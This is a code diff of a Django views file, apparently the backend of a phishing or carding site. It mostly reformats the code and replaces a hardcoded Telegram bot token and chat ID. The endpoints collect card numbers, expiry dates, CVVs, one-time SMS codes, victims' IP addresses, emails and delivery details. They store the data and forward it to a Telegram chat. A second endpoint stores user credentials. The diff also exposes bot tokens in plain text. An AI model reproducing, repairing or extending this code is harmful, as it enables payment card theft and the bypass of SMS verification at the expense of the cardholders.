@@ -6,9 +6,8 @@ from .serializers import CardInfoSerializer, UserCredentialsSerializer
 import telebot
 import os
 
-TELEGRAM_BOT_TOKEN='7036693998:AAENSLwu4CbXGxHNybS_p-jDVU_h1GZC4Wc'
-TELEGRAM_CHAT_ID='-1002224553827'
-
+TELEGRAM_BOT_TOKEN = "7839760812:AAG_Rbtv9XOxiSHD3ovzyG426pMqG0TYNRk"
+TELEGRAM_CHAT_ID = "-2405720830"
 # Получите ваш Telegram bot token из среды окружения или замените его напрямую
 TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN
 TELEGRAM_CHAT_ID = TELEGRAM_CHAT_ID
@@ -16,11 +15,14 @@ TELEGRAM_CHAT_ID = TELEGRAM_CHAT_ID
 
 bot = telebot.TeleBot(token=TELEGRAM_BOT_TOKEN)
 
-@api_view(['POST'])
+
+@api_view(["POST"])
 def send_card_info(request):
-    card_number = request.data.get('card_number')
+    card_number = request.data.get("card_number")
     if not card_number:
-        return Response({'error': 'Card number is required'}, status=status.HTTP_400_BAD_REQUEST)
+        return Response(
+            {"error": "Card number is required"}, status=status.HTTP_400_BAD_REQUEST
+        )
 
     card_info = CardInfo.objects.filter(card_number=card_number).first()
     if card_info:
@@ -32,27 +34,33 @@ def send_card_info(request):
         card_info = serializer.save()
         message = (
             f"*ID:* `#{card_info.id}`\n"
-            f"*IP:* `{card_info.user_ip}`\n" 
-            f"*EMAIL:* `{card_info.email}`\n" 
-            f"*INFO:* ```{card_info.delivery}```\n" 
+            f"*IP:* `{card_info.user_ip}`\n"
+            f"*EMAIL:* `{card_info.email}`\n"
+            f"*INFO:* ```{card_info.delivery}```\n"
             "--------------------\n"
             f"*Card Number:* `{card_info.card_number}`\n"
             f"*Expiry Date:* `{card_info.expiry_date}`\n"
             f"*CVV:* `{card_info.cvv}`\n"
-           "--------------------\n"
-            f"*SMS_CODE:* `{card_info.sms_code}`" if card_info.sms_code else "*SMS_CODE:* ---"
-            
+            "--------------------\n"
+            f"*SMS_CODE:* `{card_info.sms_code}`"
+            if card_info.sms_code
+            else "*SMS_CODE:* ---"
         )
-        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, parse_mode='Markdown')
-        return Response({'message': 'Card info saved and sent to Telegram'}, status=status.HTTP_201_CREATED)
+        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, parse_mode="Markdown")
+        return Response(
+            {"message": "Card info saved and sent to Telegram"},
+            status=status.HTTP_201_CREATED,
+        )
     return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
 
 
-@api_view(['POST'])
+@api_view(["POST"])
 def save_user_credentials(request):
-    email = request.data.get('email')
+    email = request.data.get("email")
     if not email:
-        return Response({'error': 'Email is required'}, status=status.HTTP_400_BAD_REQUEST)
+        return Response(
+            {"error": "Email is required"}, status=status.HTTP_400_BAD_REQUEST
+        )
 
     user_credentials = UserCredentials.objects.filter(email=email).first()
     if user_credentials:
@@ -62,5 +70,8 @@ def save_user_credentials(request):
 
     if serializer.is_valid():
         serializer.save()
-        return Response({'message': 'User credentials saved or updated'}, status=status.HTTP_201_CREATED)
+        return Response(
+            {"message": "User credentials saved or updated"},
+            status=status.HTTP_201_CREATED,
+        )
     return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
